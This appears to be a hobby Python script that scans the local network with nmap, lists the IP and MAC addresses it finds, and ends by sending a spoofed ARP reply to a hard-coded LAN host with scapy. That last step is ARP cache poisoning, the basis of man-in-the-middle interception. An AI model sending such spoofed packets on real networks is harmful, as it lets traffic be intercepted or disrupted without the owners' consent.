import struct
import os
import subprocess
import socket
import re
from scapy.all import *

"""
get ip address of host
link: https://stackoverflow.com/questions/166506/finding-local-ip-addresses-using-pythons-stdlib?page=1&tab=votes#tab-top
"""
def getHostIp():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    ip = s.getsockname()[0]
    s.close()
    return ip

"""
get information of NIC using "ip addr" command
"""
def nicInfo():
    proc = subprocess.Popen(["ip addr"],stdout=subprocess.PIPE, shell=True)
    (out, err) = proc.communicate()
    ip = out.decode("utf-8")
    ip = re.findall("\d+\.\d+\.\d+\.\d+\/\d+", ip)
    return ip

"""
by "nmap" command, we can scan all device which have 
link : https://stackoverflow.com/questions/13212187/is-it-possible-to-get-the-mac-address-for-machine-using-nmap
link : https://superuser.com/questions/887887/different-behavior-sudo-nmap-vs-just-nmap
"""
def nmap(ip):
    tmp = "nmap -sn -n " + ip 
    print("Command is ",tmp)
    proc = subprocess.Popen([tmp], stdout=subprocess.PIPE, shell=True)
    (out, err) = proc.communicate()
    out2 = out.decode("utf-8")
    return out2

"""
https://stackoverflow.com/questions/2761829/python-get-default-gateway-for-a-local-interface-ip-address-in-linux/6556951
"""
def get_default_gateway_linux():
    """Read the default gateway directly from /proc."""
    with open("/proc/net/route") as fh:
        for line in fh:
            fields = line.strip().split()
            if fields[1] != '00000000' or not int(fields[3], 16) & 2:
                # If not default route or not RTF_GATEWAY, skip it
                continue

            return socket.inet_ntoa(struct.pack("<L", int(fields[2], 16)))

"""
ipV4 : https://stackoverflow.com/questions/4260467/what-is-a-regular-expression-for-a-mac-address
MAC address : https://stackoverflow.com/questions/4260467/what-is-a-regular-expression-for-a-mac-address
"""
if __name__ == "__main__":
    # get ip
    ip = getHostIp()
    hostip = ip # without /24

    # get all ip of NIC, search ip in NIC
    nic = nicInfo()
    for i in nic:
        # print(ip, " ", i.split("/")[0])
        if(i.split("/")[0]==ip):
            ip = i
            break

    result = nmap(ip)
    print(result)

    # regular expression for IPv4
    ip = re.findall("\d+\.\d+\.\d+\.\d+", result)
    # regular expression for MAC 
    mac = re.findall(
        "[0-9a-fA-F]{2}[:][0-9a-fA-F]{2}[:][0-9a-fA-F]{2}[:][0-9a-fA-F]{2}[:][0-9a-fA-F]{2}[:][0-9a-fA-F]{2}", result)

    default_gateway = get_default_gateway_linux()

    for i in ip:
        if(i == hostip):
            ip.remove(i)
            break
        
    _len = len(ip)
    for i in range(0, _len):
        if(ip[i] == default_gateway):
            ip.remove(ip[i])
            mac.remove(mac[i])
            break

    print("\n")

    print("default Gateway: ", default_gateway)
    print("Current Ip ", hostip)

    print("----------------------------------------------")
    print("IP                       MAC")
    print("----------------------------------------------")    

    for i in range(0,len(ip)):
        print("%-18s       %s" % (ip[i],mac[i]))

    packet = ARP(op=2, pdst="192.168.1.106",
                 hwdst="08:00:27:DF:EF:2C", psrc="192.168.1.104")
    send(packet)